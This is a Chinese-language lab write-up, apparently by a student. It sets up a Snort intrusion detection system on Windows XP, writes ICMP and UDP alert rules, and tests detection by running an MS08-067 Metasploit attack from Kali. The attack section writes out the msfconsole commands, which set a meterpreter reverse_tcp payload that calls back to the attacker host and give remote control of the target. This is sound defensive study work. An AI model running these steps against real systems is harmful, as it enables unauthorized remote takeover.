0x01 Windows建立基于Snort的IDS

  • IDS简介：
    • 入侵检测系统（Intrusion Detection System,IDS）的作用是监控网络和计算机系统是否出现被入侵或滥用的征兆。IDS系统不需要人工干预就可以不间断的地运行，能够发现异于正常的行为的操作。
  • 实验环境：
    • 服务平台：windows xp (安装Snort)
      • IP : 192.168.195.135
    • 攻击平台：windows xp (测试snort,进行网络扫描)
      • IP : 192.168.88.145
    • Snort: snort2.9.1.2、
    • Apache : apache2.2.4、
    • PHP: php5.1.6、
    • MySQL: mysql 5.0.22、
    • Winpcap: winpcap4.0.3、
    • ACID: acid0.9、
    • Adodb : adodb5、
    • Jpgraph: jpgraph 3.0.7
  • 安装成功
    • 在snort bin目录下调用命令snort -W
    • 看到小猪安装成功
  • 嗅探模式
    • 嗅探命令:snort -i 1
  • snort数据包记录器模式
    • 进入dos的snort目录下运行命令：snort –de –l "c:\Snort\log"
    • 进入snort包记录器模式。可以到c:\Snort\log 下查看snort记录的数据包（用wireshark查看）
  • 攻击检测模式
    • 将snortrules-snapshot-2903规则配置到Snort的目录下。
    • 编写规则alert icmp any any -> $HOME_NET any (msg:"icmp Packet";sid:1234567890;rev:1;)将其放在rules目录下的local.rules 。该规则将所有ICMP包拦截下来，并提出警告icmp Packet.
    • 然后在DOS端执行命令
      • snort -c "c:\Snort\etc\snort.conf" -l "c:\snort\log"
      • 同时在攻击机调用命令ping 192.168.195.135 -t 来对靶机192.168.195.135发送ICMP包
    • alert.ids即报警日志，我们可以看到

0x02 添加UDP监测规则

  • 在本地添加对UDP的监控规则
    • alert udp any any -> $HOME_NET any (msg:"udp ids/dns-version-query";content:"version";sid:5555;rev:1;)
      • 他的含义是：对于任意IP任意端口到任意IP任意端口的数据段为version的udp包产生警告，输出警告信息为udp ids/dns-version-query
  • 在攻击机使用udpfood工具对靶机的80端口进行攻击，同时靶机根据snort所设定的规则对流量进行监控。
    • 在DOS端执行命令snort -c "c:\Snort\etc\snort.conf" -l "c:\snort\log"
    • 在idert.ids里面可以看到

0x05 基于MS08-067的攻击实验

  • 漏洞简介

    • MS08-067漏洞将会影响Windows 2000/XP/Server 2003/Vista/Server 2008的各个版本，甚至还包括测试阶段的Windows 7 Pro-Beta。
    • 如果用户在受影响的系统上收到特制的 RPC 请求，则该漏洞可能允许远程执行代码。 在 Microsoft Windows 2000、Windows XP 和 Windows Server 2003 系统上，攻击者可能未经身份验证即可利用此漏洞运行任意代码。 此漏洞可能用于进行蠕虫攻击。 防火墙最佳做法和标准的默认防火墙配置有助于保护网络资源免受从企业外部发起的攻击。

  • 实验环境

    • 工具：metasploit

    • 攻击机的IP（kali）：192.168.195.136

    • 靶机IP（xp3）: 192.168.195.135

    • 实验条件：两台机子可以互通的，并且windows xp3（需打开445端口，默认为打开）开启了445端口，防火墙是关闭的。

  • 在xp终端使用命令snort -c "c:\Snort\etc\snort.conf" -l "c:\snort\log"

  • 在kali端借用msfconsole，启动metasploit工具

  • 输入命令search ms08_067，查找关于ms08_067的漏洞模块。

  • 输入以下命令，使用该模块

  • 设置配置项

    • 设置靶机IP: set rhost 192.168.195.135
    • 设置要执行的payload: set payload windows/meterpreter/reverse_tcp
    • 设置攻击机kali的IP：set lhost 192.168.195.136
    • 设置要攻击的目标操作系统类型：set target 34

  • 用show options查看相关参数是否配置正确

  • 最后，输入exploit，回车运行,进入到特殊的payload—meterpreter，该payload在控制靶机之后，能够对靶机执行更多的渗透攻击。用 pwd查看靶机当前的工作路径，用ipconfig命令查看靶机的IP地址配置.

  • 与此同时，回到安装有snort的靶机监控中，在报警日志中我们可以看到

  • 从实验结果的报警信息，可以看到snort报警的特点有：

    • Snort是对于网络数据包的检测，而杀毒软件则更多的是对于主机数据的监控和检测。
    • Snort的报警是基于系统漏洞脆弱性的报警，而不是漏洞利用的过程。MS08-067漏洞是针对windows xp sp2、sp3、2003 server等系列动态链接库netapi32.dll的NetpwPathCanonicalize函数对于字符串的处理存在典型的缓冲区溢出漏洞，并且NetpwPathCanonicalize可以被RPC调用，漏洞利用成功后可以打开被攻击主机端口并获取权限.

0x06 总结心得

  • 通过这个实验，对入侵检测系统的相关内容有了一定的了解，对入侵检测系统在windows环境下的运行有了认识。通过配置snort.conf，apache等等来搭建环境完成实验。
  • 对snort的使用有了深刻地体会。此外，通过学习snort规则编写的语法，能根据规则写出简易正确的规则。对TCP、UDP、ICMP协议有了更深层次的回顾。对snort的作用印象更深。
  • 同时对网络扫描和渗透扫描攻击msfconsole的使用有一定的回顾。
